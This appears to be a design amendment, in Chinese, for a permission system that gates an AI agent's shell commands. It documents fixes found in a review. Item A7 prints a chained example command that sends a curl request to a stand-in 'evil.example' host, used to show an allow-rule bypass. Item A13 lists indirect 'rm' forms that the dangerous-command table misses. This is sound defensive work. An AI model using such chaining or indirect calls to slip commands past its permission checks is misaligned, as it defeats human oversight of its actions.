# B-P1 Amendment 3 — flash 冷读复评修复（A7-A13）

**Status**: IMPLEMENTED — 2026-08-05（flash 冷读复评 v14 发现并修复；
全矩阵 + Swift 真实 IPC 契约测试通过）

## 背景

子代理协作通道在本机持续空载荷（v12/v13 均复现，已记录于 REVIEW-NOTES），
无法再派发 fresh 独立评审。按 Product Owner 指示"继续用 flash 来评估"，
本 Agent 以 flash 身份对提交链 `91d14f42^..HEAD` 做冷读复评（不依赖既有
结论），发现以下问题并全部处置。

## A7（P0 修复，已实现 — 链式命令 allow 越界）

- 现象：`bashPatternMatches` 用整串前缀/glob 匹配 allow 规则与 grants。
  默认模板 `go test *` 因此放行 `go test ./... && curl https://evil.example/x`
  （curl 为网络命令，契约要求 ask），`git diff && curl …` 同理；危险段检查
  只拦危险命令，拦不住网络/写入等普通副作用段。这违反契约 §3.2
  "allow 只按整串匹配" 与 RED #6 语义。
- 修复：`bashPatternMatches` 改为**段数对齐整串匹配**——pattern 与 command
  按 `&&`/`||`/`;`/`|` 分段后段数必须相同，且每个 pattern 段按前缀/glob
  匹配对应 command 段；单段 allow 无法放行链式命令；显式链式 pattern
  （如 `go test ./... && go vet ./...`）仍精确放行。
- RED：`TestRed20_AllowRuleCannotPassNonDangerousChain`（先红后绿）。

## A8（P1 修复，已实现 — Swift 原生 app attention 不完整）

- 现象：Go `PermissionAttention` 含 `approvals`（待批项），Swift
  `PermissionAttention` 模型/视图只含 `decisions`，原生 app 读不到
  Attention Inbox 待批项，与契约 §6.4"读到相同 explorer/attention 状态"
  不符。另发现 Swift `PermissionDecisionView.approvalID` 为非可选，而服务端
  在 decision 尚未关联批准时 omitempty 省略 `approval_id`，真实 attention
  响应会在客户端解码失败。
- 修复：新增 `PermissionApprovalView` 并接入 `PermissionAttention.approvals`
  （模型/视图/测试）；`approvalID` 改为可选；`LoomLocalAppContractProbe`
  输出 `approvals` 计数；新增真实 IPC 契约测试
  `TestBp1SwiftProbeDecodesRealPermissionAttentionWithApprovals`（生产 Swift
  客户端经真实 daemon socket 读取 pending 批准并断言 decisions≥1、
  approvals≥1）。

## A9（P1 修复，已实现 — EffectiveMode 非确定性）

- 现象：`EffectiveMode` 对 personal/project 激活直接遍历 `map`，存在多个
  同层激活时裁决结果依赖 map 迭代顺序，破坏 Evaluate 的确定性承诺。
- 修复：同层激活先按 `ScopeID` 字典序排序，取最小者（确定性；单项目
  daemon 下语义不变）。
- RED：`TestRed20_EffectiveModeDeterministicAcrossActivations`。

## A10（P2 修复，已实现 — Denial.RuleIDs 非确定性）

`matchedRuleIDs`/`askOverAllowAtNarrowestScope` 输出按 map 派生顺序拼接的
RuleIDs；已排序后返回。RED：`TestRed20_DenialRuleIDsAreDeterministicallySorted`。

## A11（P2 修复，已实现 — 激活/管理员锁事件流校验）

`Replay` 此前未校验 `PermissionActivationActivated/Deactivated` 与
`PermissionAdminLock*` 的 StreamID；现要求 activation 必须在
`permission-activation` 流、admin lock 必须在 `permission-admin-lock` 流，
否则 Replay error（fail-closed）。RED：
`TestRed20_ActivationStreamMismatchRejected`。

## A12（P2 记录，不阻塞 — decision 与 approval 的直接关联）

`validate_call` 先写 `PermissionDecisionRecorded`（此时尚无 approval_id），
再创建批准，故决策事实的 `approval_id` 恒为空。审计关联可经 JobID + call
digest（`ApprovalRequested` 的 ContractDigest）+ 时间戳推导；直接关联留待
B-W1 执行适配器接线时以 bounded amendment 补齐（避免引入第二套决策事实或
跨流原子写）。

## A13（P2 记录，不阻塞 — 危险命令表的间接调用边界）

冻结危险表不含 `sudo rm`/`xargs rm`/`sh -c "rm …"` 等间接调用；按契约
§3.4"冻结初始表"，策略层以表为准，进程级兜底由 B-W1 执行适配器的 OS
sandbox 承担（已在 B-C-BLOCKER-ASSESSMENT.md 记录）。

## 验证

- `go build ./...`、`go vet ./...`、`go test ./...` 全 PASS（含新增
  RED #20 与 Swift 真实 IPC 契约测试）。
- `swift build` + `swift test`：98 tests PASS（1 skipped）+ 4 Swift Testing
  PASS。
- 既有旅程 final13（journey_id `7266f17f-…`）verify 保持 PASS；本修订不改
  变其记录的裁决事实。由于 Swift attention 模型修复影响客户端解码，
  新旅程 final14（含原生 app 读取 pending 批准）列为推荐补充证据，已由
  真实 IPC 契约测试覆盖等价路径。
